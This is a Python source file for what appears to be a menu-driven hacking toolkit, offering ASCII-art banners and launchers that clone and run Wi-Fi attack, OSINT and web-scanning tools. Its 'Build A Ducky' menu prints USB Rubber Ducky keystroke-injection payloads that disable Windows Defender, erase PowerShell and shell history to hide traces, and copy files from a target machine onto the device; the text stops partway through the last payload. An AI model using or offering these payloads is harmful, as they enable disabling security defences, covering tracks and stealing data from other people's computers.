           .#:. #...%..:...:#.::....::::.%@@@@@@@@@%@@::.-#.:@@%@@@@@%#. . .......=#..               
           .+-..+.-....%..:=: .:*.:::..:#::..::*@@@@@@:=.-*:.+@@%@@@@@@@@+...:-*#:.                  
           =.+.@*.:++*.=-.-....--..=.-..*..... ...=%@@:=#.:*.:@@@@@@@@@@@@@*..... .                  
           +%-.....: .==.=#-..*-......:..-.    . ....#.%-.%=.:::...........                          
           =..............*..:=*=.**-+-#.%.   .....++.-@..+..+.. ....   .                            
           -::.....*.=@:.+*..:-=..*..-..*-....-+..    -#.. :.*..                                     
           ..*%@@%#@@@@@@@*..-*@@@*.#..=@@*..:..+:.   +@...:.*. .                                    
               #-=@*..   .+..=@@@@@@@@@@@@%..:.:+-....    ..#=:.                                     
              ..:##=     .+..@@@@@@@@@@@@@....+.#-:...   .-:-:*                                      
              . #.--..   ..-:@@@@@@@@@@@-.. ...#:+*.. .  .:%#.%..                                    
              ..:-.=..   . +:@@@@@@@@@#....   ..+::......=%+.:+.                                     
              . .+.*..   ..=+-*#%@@@%...   .....-%:. ...==..+-...                                    
              ....+#.    -==.#::..+=...    =.#.+.:=+......%:....                                     
                  .#....:=+--*....*.   ..-#=+..+.::*...:%. ..                                        
                  .....:#..:.:... #.   .+#...-........@......                                        
                     ..:..#...-:..+...-%:..*=..:-.. =+....                                           
                     .=.-+*.:+....#.*-...:.==..-@..-*.. .                                            
                     .+=..+-#....#@......#-....+= .@.                                                
                      .#.:+..*..:...= +........*...#..                                               
                     ...# ....-.:.=#. .....   ....-:.                                                
                     .....#:.:.-...*+......    ...@. .                                               
                         ....-##....     .........%...                                               
                         ..... .=...   ....::*..++....                                               
                                .*..-:*+*-.:-##....                                                  
                                .:*=-+*#*=.........                                                  
''' , 'red'))

def ascii_probing_sign():
    print('''
                    _  (`-')   (`-')            <-.(`-')   _     <-. (`-')_           
           \-.(OO )<-.(OO )      .->    __( OO)  (_)       \( OO) )    .->   
          _.'    \,------,)(`-')----. '-'---.\  ,-(`-'),--./ ,--/  ,---(`-')
          (_...--''|   /`. '( OO).-.  '| .-. (/  | ( OO)|   \ |  | '  .-(OO )
          |  |_.' ||  |_.' |( _) | |  || '-' `.) |  |  )|  . '|  |)|  | .-, \
          
          |  .___.'|  .   .' \|  |)|  || /`'.  |(|  |_/ |  |\    | |  | '.(_/
          |  |     |  |\  \   '  '-'  '| '--'  / |  |'->|  | \   | |  '-'  | 
          `--'     `--' '--'   `-----' `------'  `--'   `--'  `--'  `-----'  
                 (`-')  _ <-. (`-')_  _(`-')                                       
                 (OO ).-/    \( OO) )( (OO ).->                                    
                 / ,---.  ,--./ ,--/  \    .'_                                     
                 | \ /`.\ |   \ |  |  '`'-..__)                                    
                 '-'|_.' ||  . '|  |) |  |  ' |                                    
                (|  .-.  ||  |\    |  |  |  / :                                    
                 |  | |  ||  | \   |  |  '-'  /                                    
                 `--' `--'`--'  `--'  `------'                                     
          (`-')      (`-')  _ (`-').->(`-')      _     <-. (`-')_            
          ( OO).->   ( OO).-/ ( OO)_  ( OO).->  (_)       \( OO) )    .->    
          /    '._  (,------.(_)--\_) /    '._  ,-(`-'),--./ ,--/  ,---(`-') 
          |'--...__) |  .---'/    _ / |'--...__)| ( OO)|   \ |  | '  .-(OO ) 
          `--.  .--'(|  '--. \_..`--. `--.  .--'|  |  )|  . '|  |)|  | .-, \ 
             |  |    |  .--' .-._)   \   |  |  (|  |_/ |  |\    | |  | '.(_/ 
             |  |    |  `---.\       /   |  |   |  |'->|  | \   | |  '-'  |  
             `--'    `------' `-----'    `--'   `--'   `--'  `--'  `-----'    
          ''')

######-------------------------------------------Cracking and Breaking -----------------------------------------######

def ascii_cracking_breaking():
    print('''
    

 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌ ▐░▌  ▀▀▀▀█░█▀▀▀▀ ▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌▐░▌       ▐░▌     ▐░▌▐░▌    ▐░▌▐░▌          
▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌░▌        ▐░▌     ▐░▌ ▐░▌   ▐░▌▐░▌ ▄▄▄▄▄▄▄▄ 
▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░▌         ▐░▌     ▐░▌  ▐░▌  ▐░▌▐░▌▐░░░░░░░░▌
▐░▌          ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░▌░▌        ▐░▌     ▐░▌   ▐░▌ ▐░▌▐░▌ ▀▀▀▀▀▀█░▌
▐░▌          ▐░▌     ▐░▌  ▐░▌       ▐░▌▐░▌          ▐░▌▐░▌       ▐░▌     ▐░▌    ▐░▌▐░▌▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀    ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                        .                              
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄                   |                             
▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░▌                  |
▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀█░▌              ,-'"`-.         
▐░▌       ▐░▌▐░▌▐░▌    ▐░▌▐░▌       ▐░▌            ,'       `.                                          
▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌▐░▌       ▐░▌            |  _____  |      .-( HEY baby,lets go out)                                        
▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌       ▐░▌            | (_o_o_) |    ,'    ( and kill all humans.)                                       
▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌▐░▌       ▐░▌            |         | ,-'                                       
▐░▌       ▐░▌▐░▌    ▐░▌▐░▌▐░▌       ▐░▌            | |HHHHH| |                                       
▐░▌       ▐░▌▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌            | |HHHHH| |                                       
▐░▌       ▐░▌▐░▌      ▐░░▌▐░░░░░░░░░░▌           -'`-._____.-'`-                                        
 ▀         ▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀                                                              
                                                                                                                              
 ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄    ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌ ▐░▌  ▀▀▀▀█░█▀▀▀▀ ▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌▐░▌       ▐░▌     ▐░▌▐░▌    ▐░▌▐░▌          
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌░▌        ▐░▌     ▐░▌ ▐░▌   ▐░▌▐░▌ ▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌         ▐░▌     ▐░▌  ▐░▌  ▐░▌▐░▌▐░░░░░░░░▌
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌        ▐░▌     ▐░▌   ▐░▌ ▐░▌▐░▌ ▀▀▀▀▀▀█░▌
▐░▌       ▐░▌▐░▌     ▐░▌  ▐░▌          ▐░▌       ▐░▌▐░▌▐░▌       ▐░▌     ▐░▌    ▐░▌▐░▌▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░▌ ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░▌ ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌  ▐░▌▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀    ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 


    ''')


########-------------------------------------------------------Cameras--------------------------------------------------------########

def ascii_cameras():

    print('''

              ___             ///////
             (__|______--/| /   ////
            __/  +--+| |-\| (>   )/     ,"-------------
           |_|ooo+--+|_|    /_    /   ,"  I'm Always    ",
            `-------'       |_, //  _-"  Watching You! ,"
                            |___/  <------------------"


''')

##########------------------------------------------------Blackbird--------------------------------------########

def ascii_blackbird():

    print(colored('''
          
               _.------.
           _.-`    ('>.-`"""-.
 '.__.---'`       _'`   _ .--.)
jgs     -'         '-.-';`   `
        ' -      _.'  ``'--. 
            '---`    .-'""`
                   /`

          ''' , 'red'))

#######------------------------------------------------dark web crawler---------------------------------------------------------########

def ascii_dark_web_crawler():

    print('''   
                         ______                     
     _________        .---"""      """---.              
    :______.-':      :  .--------------.  :             
    | ______  |      | :                : |             
    |:______B:|      | |    Dark Web    | |             
    |:______B:|      | |     Crawler    | |             
    |:______B:|      | |  ------------  | |             
    |         |      | |   What Do You  | |             
    |:_____:  |      | |  Wish To Find? | |             
    |    ==   |      | :                : |             
    |       O |      :  '--------------'  :             
    |       o |      :'---...______...---'              
    |       o |-._.-i___/'             \._              
    |'-.____o_|   '-.   '-...______...-'  `-._          
    :_________:      `.____________________   `-.___.-. 
                     .'.eeeeeeeeeeeeeeeeee.'.      :___:
                   .'.eeeeeeeeeeeeeeeeeeeeee.'.         
                  :____________________________:
          ''')



######## ----------------------------------------------- import list -------------------------------------------------- #######
from optparse import Option
import os
os.system('python3 -m pip install pyqt5 --upgrade')
os.system('pip3 install termcolor')
os.system('pip3 install colorama')
os.system('pip3 install pillow')
os.system('pip3 install ascii_magic')
import ascii_magic
from ascii_magic import AsciiArt
import termcolor
from termcolor import colored
import subprocess
import requests
import sys
import time
import colorama
import dnstwist
import re
import socket
import signal
import argparse
import threading
import json
import queue
import urllib.request
import urllib.parse
import gzip
from io import BytesIO
from datetime import datetime

####### ------------------------------------------ os sysem updates and commands --------------------------------------------------- #######

def update():
    os.system("sudo apt-get update")
    os.system("sudo apt full-upgrade")

def clear_screen():
    subprocess.run('clear' if os.name == 'posix' else 'cls')

def Purgatory():
    print("", end="", flush=True) 
    for char in " \033[91m1\033[0m)\033[92m Resources and Monitoring":
        print(char, end="", flush=True) 
        time.sleep(0.04)
    time.sleep(3)


######### ---------------------------------- EXIT PROGRAM -------------------------------------------------------- #########
def exit():
    print(colored('It is not yet your time.' , 'red' , attrs=[ 'reverse' , 'blink' , 'bold']))
    sys.exit()

####### ------------------------- Main Menu DEF ----------------------- ########
def menu():
    clear_screen()

    main_menu()

########----------------------------------Change------------------------------------------#######

def change():

    script_dir = os.path.dirname(os.path.abspath(__file__))
    os.chdir(script_dir)


#######-----------------------------------Header-------------------------------------------------------------#########



########------------------------------------Foot--------------------------------------------------------------------------########
def foot():
    
    print(" ")
    print(" ")
    print(colored('Type BACK to go back. Type MAIN to go to the main. Type EXIT to close the program' ,  'red' , attrs=['reverse' , 'blink' , 'bold']))
    print(" ")
    print(" ")

 ####### --------------------------- ANON SURF --------------------------------- ########
def Anonsurf():

    print(colored('Welcome to Anon Surf, please install before running' , 'red'))
    print("Tor service through a linux terminal")
    print("-------------------------------------------------------------------------------------------")
    print(" ")
    print("1) Install")
    print("2) Run")
    print("3) Status")
    print("4) Stop") 

    foot()

    option = input("> ")

    if option == "1":
        clear_screen()
        os.system("sudo apt install tor")
        Anonsurf()

    elif option == "2":
        clear_screen()
        os.system("sudo service tor start")
        Anonsurf()

    elif option == "3":
        clear_screen()
        os.system("sudo service tor status")
        Anonsurf()

    elif option == "4":
        clear_screen()
        os.system("sudo service tor stop")
        Anonsurf()

    elif option == "BACK":
        clear_screen()
        Heaven()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    elif option == "EXIT":
        exit()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Anonsurf()     


############----------------------------------------------Subnet Wizard------------------------------------###########

def SubnetWizard():
    
    print('''
          Console-based Subnet/supernet calculator. 
          Simplifies subnetting tasks. 
          The python commands are for Linux only.
          ''')
    print("=====================================================")
    print("1) Install / First Time Use")
    print("2) Run")

    foot()

    option = input("> ")

   

    if option == "1":
        clear_screen
        os.system("git clone https://github.com/naemazam/SubnetWizard.git")
        SubnetWizard()

    elif option == "2":
        clear_screen()
        os.chdir("SubnetWizard")
        os.system("python3 main.py")
        SubnetWizard()

    elif option == "BACK":
        clear_screen()
        Heaven()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        SubnetWizard()          

########-------------------------------------Email Analyzer---------------------------------------------#############

def Email_Analyzer():
    change()
    print("Email Analyzer is a program for analyzing suspicious emails.")
    print("Make sure the files you want scanned are in the same CD / Directory")
    print("---------------------------------------------------------------------------------------------------------------")
    print("1) Install")
    print("2) Run")
    
    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        os.system("git clone https://github.com/keraattin/EmailAnalyzer.git")
        Email_Analyzer()

    if option == "2":
        clear_screen()
        os.chdir("EmailAnalyzer")
        email = input("Enter Email File: ")
        subprocess.run("python3" , "email-analyzer.py" , "-f" , email)

    elif option == "BACK":
        clear_screen()
        Heaven()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Email_Analyzer()   

#########-------------------------------------------DNS Twist---------------------------------------------#########

def DNSTwist():
    change()

    print("DNS Twist is a scanner for malicious DNS Fuzzing. Uncovered malicious Domains.")
    print("THIS INSTALL IS FOR LINUX ONLY")
    print("------------------------------------------------------------------------------------------")
    print(" ")
    print("1) Install")
    print("2) Run Registered Scan")

    print

    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        os.system("sudo apt install dnstwist")
        DNSTwist()

    elif option == "2":
        clear_screen()
        domain = input("Enter Domain URL: ")
        subprocess.run("dnstwist" , "--registered" , domain)
        DNSTwist()
    
    elif option == "BACK":
        clear_screen()
        Heaven()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        DNSTwist()   

####### --------------------------------------- HEAVEN BRANCH ------------------------------------- #######
def Heaven():
    change()
    clear_screen()
    ascii_icarus()
    ascii_heaven_sign()

    print("1) Anonsurf")
    print("2) Subnet Wizard")
    print("3) Email Analyzer")
    print("4) DNSTwist")

    foot()

    option = input("> ")

    if option == "1":
        clear_screen()
        Anonsurf()

    elif option == "2":
        clear_screen()
        SubnetWizard()

    elif option == "3":
        clear_screen()
        Email_Analyzer()

    elif option == "4":
        clear_screen()
        DNSTwist()

    elif option == "BACK":
        clear_screen()
        main_menu()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Heaven()     

##########------------------------------------------------------------Blackbird Email--------------------------------------------------------#############

def Blackbird_Email():

        print('''
          
You can choose to run the username and 
have it exported to PDF or default HTTP

          ''')
        
        print("1) Search Email (Default / HTTP)")
        print("2) Search Email (Export to PDF)")

        foot()

        option = input("> ")

        if option == "1":
            clear_screen()
            email = input("Enter: ")
            subprocess.run(["python3" , "blackbird.py" , "--email" , email])
            Blackbird_Email()

        elif option == "2":
            clear_screen()
            email = input("Enter: ")
            subprocess.run(["python3" , "blackbird.py" , "--email" , email , "--pdf"])
            Blackbird_Email()

        elif option == "BACK":
            clear_screen()
            Blackbird()

        elif option == "MAIN":
            clear_screen()
            main_menu()
    
        else:
            print("\033[91m Do not stray from the path, try again\033[0m")
            time.sleep(1)
            clear_screen()
            Blackbird_Email() 


#######--------------------------------------------------------------Blackbird Username--------------------------------------------------###########

def Blackbird_Username():

    print('''
          
You can choose to run the username and 
have it exported to PDF or default HTTP

          ''')

    print("1) Search Username (Default / HTTP)")
    print("2) Search Username (Export to PDF)")

    foot()

    option = input("> ")

    if option == "1":
        clear_screen()
        username = input("Enter:")
        subprocess.run(["python3" , "blackbird.py" , "--username" , username])
        Blackbird_Username()

    elif option == "2":
        clear_screen()
        username = input("Enter: ")
        subprocess.run(["python3" , "blackbird.py" , "--username" , username , "--pdf"])
        Blackbird_Username()
        

    elif option == "BACK":
        clear_screen()
        Blackbird()

    elif option == "MAIN":
        clear_screen()
        main_menu()
    
    else:
            print("\033[91m Do not stray from the path, try again\033[0m")
            time.sleep(1)
            clear_screen()
            Blackbird_Username() 

#########--------------------------------------------------------------Blackbird-----------------------------------------------------#######

def Blackbird():
    change()
    ascii_blackbird()

    print('''
          Blackbird is an OSINT that searches for accounts
          by username / email across mutli platforms.
          It will export to PDF, CSV and HTTP
          
          ''')
    print("===================================================")
    print("")
    print("1) Install")
    print("2) Run Username")
    print("3) Run Email")
    print("3) exit")

    foot()

    option = input("> ")

    if option == "1":
        clear_screen()
        os.system("git clone https://github.com/p1ngul1n0/blackbird")
        os.chdir("blackbird")
        os.system("pip install -r requirements.txt")
        Blackbird()

    elif option == "2":
        clear_screen()
        Blackbird_Username()

    elif option == "3":
        clear_screen()
        Blackbird_Email()

    elif option == "BACK":
            clear_screen()
            OSINT_Tools()

    elif option == "MAIN":
            clear_screen()
            main_menu()
    
    else:
            print("\033[91m Do not stray from the path, try again\033[0m")
            time.sleep(1)
            clear_screen()
            Blackbird() 


###########------------------------------------------------------------OSINT Tools--------------------------------------------############

def OSINT_Tools():

    print("List of OSINT Frameworks For Gathering Information")

    print("-------------------------------------------------------")
    print("1) Blackbird")

    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        Blackbird()
    
    elif option == "Back":
        clear_screen()
        Monitoring_and_Recon()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        OSINT_Tools()
    


    
######### -----------------------------------------------Monitoring and Recon List ---------------------------------------######
def Monitoring_and_Recon():
        
        change()

        print("1) OSINT Tools")
        print("2) Vehicle Info")
        
        foot()
        
        option = input("> ")

        if option =="1":
            clear_screen()
            OSINT_Tools()
        
        elif option == "BACK":
            clear_screen()
            Hell()

        elif option == "MAIN":
            clear_screen()
            main_menu()
        
        else:
            print("\033[91m Do not stray from the path, try again\033[0m")
            time.sleep(1)
            clear_screen()
            Monitoring_and_Recon() 
###########---------------------------------------------Dirhunt------------------------------------------------------#######

def Dirhunt():

    print("Directory hunter that detects directories with false 404 errors. Scans for epty file index directories that have been created to hide things and more")
    print("--------------------------------------------------------------------------------------------------------------------------------------------------------")
    print(" ")
    print("1) Install")
    print("2) Run")

    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        os.system("sudo pip3 install dirhunt")
        Dirhunt()

    elif option == "2":
        clear_screen()
        url = input("Enter URL: ")
        subprocess.run("dirhunt" , url)
        Dirhunt()
    
    elif option == "BACK":
        clear_screen()
        Web_Scanner()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Dirhunt()         


#########---------------------------------------------Web Scanner-----------------------------------------------########

def Web_Scanner():
    change()
    print("These are a series of web scanners that recover info from URL's for ")
    print("-------------------------------------------------------------------------")
    print(" ")
    print("1) Dirhunt")

    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        Dirhunt()

    elif option == "BACK":
        clear_screen()
        Web_Scanner()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Web_Scanner()  

############-----------------------------------------------------Cameras------------------------------------------------------------##########

def Cameras():

    change()

    ascii_cameras()

    print("This page is under construction")

    foot()
    
    option = input("> ")
    
    if option == "BACK":
        clear_screen()
        Probing()

    elif option == "MAIN":
        clear_screen()
        main_menu()
    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Cameras() 

####### ------------------------------------ Probing and Testing -----------------------------------------------------############
def Probing():

        change()

        print("1) Cameras.")
        print("2) Web Scanner")
        
        foot()
        
        option = input("> ")

        if option == "1":
            clear_screen()
            Cameras()

        elif option == "2":
            clear_screen()
            Web_Scanner()

        elif option == "BACK":
            clear_screen()
            Hell()

        elif option == "MAIN":
            clear_screen()
            main_menu()
    
        else:
            print("\033[91m Do not stray from the path, try again\033[0m")
            time.sleep(1)
            clear_screen()
            Probing() 
        

#######---------------------------------------- Passwords -----------------------------------------------#######

def passwords():

    change()

    print("This page is still under construction")
    
    foot()
    
    option = input("> ")
    
    if option == "BACK":
        clear_screen()
        cracking_and_breaking()

    elif option == "MAIN":
        clear_screen()
        main_menu()
    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        passwords() 
    

######### -----------------------------------------------------Accounts---------------------------------------------------#########

def accounts():

    change()

    print("This page is still under construction")
    
    foot()
    
    option = input("> ")

    if option == "BACK":
        clear_screen()
        cracking_and_breaking()

    elif option == "MAIN":
        clear_screen()
        main_menu()
    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        accounts() 

#######------------------------------------------- Wef ------------------------------------------------------------#########
def Wef():

    change()

    print('''Wef is a multi tool for Wi-Fi attacks. It provides the following.
          DoS Attacks / WEP Attacks / Evil Twin Attach / WPS Attack / Handshake Attacks
          
          After install, configuration for the program will be needed.
          You will lose internet connection while the application is running.
          ''')

    print("1) Install / First Time Run")
    print("2) Run")
    print("3) Main Menu")
    
    foot()
    
    option = input("> ")
    
    if option == "1":
        clear_screen()
        os.system("git clone https://github.com/D3Ext/WEF")
        os.system("cd WEF")
        os.system("sudo bash wef -i wlan0")

    elif option == "2":
        clear_screen()
        os.system("cd WEF")
        os.system("sudo bash wef -i wlan0")

    elif option == "3":
        clear_screen()
        main_menu()
        
    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()
        Wef() 


#######-----------------------------------------------WiFi------------------------------------------------------------#########

def WiFi():

    change()

    print("1) Wef")
    option = input("> ")

    foot()

    if option == "1":
        clear_screen()
        Wef()

    elif option == "BACK":
        clear_screen()
        cracking_and_breaking()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()

#######------------------------------------------------Ducky 2 Python--------------------------------------#######

def Ducky2python():

    change()

    print('''
Ducky 2 Pyhon is a program that will turn your ducky script
into a python script. Written in Javascript, HTML, CSS.
The program also is a drag and drop feature.
Script will be saved as PythonScript.py from the ducky2python.py directory        
        ''')
    
    print("1) Install")
    print("2) Run")

    foot()

    option = input("< ")

    if option == "1":
        clear_screen()
        os.system("git clone https://github.com/CedArctic/ducky2python.git")
        os.system("pip install pyautogui")
        os.chdir("ducky2python.py")

    elif option == "2":
        clear_screen()
        os.system("python3 ducky2python.py")

    elif option == "BACK":
        clear_screen()
        cracking_and_breaking()

    elif option == "MAIN":
        clear_screen()
        main_menu()

    else:
        print("\033[91m Do not stray from the path, try again\033[0m")
        time.sleep(1)
        clear_screen()

#########---------------------------------------------Build A Ducky------------------------------------#######

def Build_A_Ducky():

    change()

    print(''' 
    This is the Rubber Ducky Builder. 
    This will be a starting template for a rubber ducky script. 
    These can be copied and pasted to a notepad for building.
    ''')
    print(" ")
    print("---------------------------------------------------------------------------------------------------")
    print(" ")
    print("1) Payload Intro")
    print("2) Disable Windows")
    print("3) Turn Defender On")
    print("4) Passive Windows Detect")
    print("5) Erase Traces Powershell")
    print("6) Erace Traces Shell")
    print("7) Open Powershell")
    print("8) Open A Shell")
    print("9) Save Files In Rubber Ducky Storage - Windows")
    print("10) Grab Wifi Passwords / Must input Webhook ID")


    foot()

    option = input("< ")

    
    if option == "1":
        print('''
REM_BLOCK
#############################
#                           #
# Title        : example    #
# Author       : example    #
# Version      : 1.0        #
# Category     : example    #
# Target       : OS example #
#                           #
#############################
END_REM  
              ''')
        Build_A_Ducky()
        
    elif option == "2":
        print('''
DEFAULT_DELAY 1000
DELAY 10000
CTRL ESC
STRING cmd /C "sc stop WinDefend"
CTRL-SHIFT ENTER
LEFTARROW
ENTER               
              ''')
        Build_A_Ducky()
        
    elif option == "3":
        print('''              
DDEFAULT_DELAY 1000
DELAY 10000
CTRL ESC
STRING cmd /C "sc start WinDefend"
CTRL-SHIFT ENTER
LEFTARROW
ENTER
              ''')
        Build_A_Ducky()

    elif option == "4":
        print('''
EXTENSION PASSIVE_WINDOWS_DETECT
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        Windows fully passive OS Detection and passive Detect Ready
        Includes its own passive detect ready.
        Does not require additional extensions.

        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay
            $_OS will be set to WINDOWS or NOT_WINDOWS
            See end of payload for usage within payload
    END_REM

    REM CONFIGURATION:
    DEFINE #MAX_WAIT 150
    DEFINE #CHECK_INTERVAL 20
    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
    DEFINE #NOT_WINDOWS 7

    $_OS = #NOT_WINDOWS

    VAR $MAX_TRIES = #MAX_WAIT
    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
        DELAY #CHECK_INTERVAL
        $MAX_TRIES = ($MAX_TRIES - 1)
    END_WHILE
    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
        $_OS = WINDOWS
    END_IF

    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
        IF ($_OS == WINDOWS) THEN
            STRING HELLO WINDOWS!
        ELSE
            STRING HELLO WORLD!
        END_IF
    END_REM
END_EXTENSION         
              ''')
        Build_A_Ducky()

    elif option == "5":
        print('''
REM Clear the command history in PowerShell by deleting the history file
STRINGLN Remove-Item (Get-PSReadlineOption).HistorySavePath      
              ''')
        Build_A_Ducky()

    elif option == "6":
        print('''

REM It is assumed that a shell has already been opened...
STRINGLN rm $HISTFILE; exit
            ''')
        Build_A_Ducky()

    elif option == "7":
        print('''
GUI r
DELAY 1000
STRINGLN PowerShell
DELAY 1000          
              ''')
        Build_A_Ducky()

    elif option == "8":
        print('''
CTRL-ALT t
DELAY 1000             
            ''')
        Build_A_Ducky()

    elif option == "9":
        print('''
              
EXTENSION SAVE_FILES_IN_RUBBER_DUCKY_STORAGE_WINDOWS
    REM VERSION 1.0
    REM AUTHOR: Aleff
    REM_BLOCK Documentation
        This extension is used to save one or more files through the USB Rubber Ducky storage.

        TARGET:
            Windows 10/11

        USAGE:
            Insert this extension when you have one or more files that you want to save in your USB Rubber Ducky.

        CONFIGURATION:
            Set #DRIVER_LABEL variable with the correct Label of your USB Rubber Ducky considering that the default value is 'DUCK'.

            Set #FLAG_SINGLE_FILE with TRUE if you want to save just one file.
            In this case you will need to specify the file path within the #SINGLE_PATH variable OR, in case the exact path to the file you can only acquire it at runtime and so via the powershell, use in the powershell the $fileToSavePath variable to capture this path.
                i.e. in DuckyScript EXTENSION
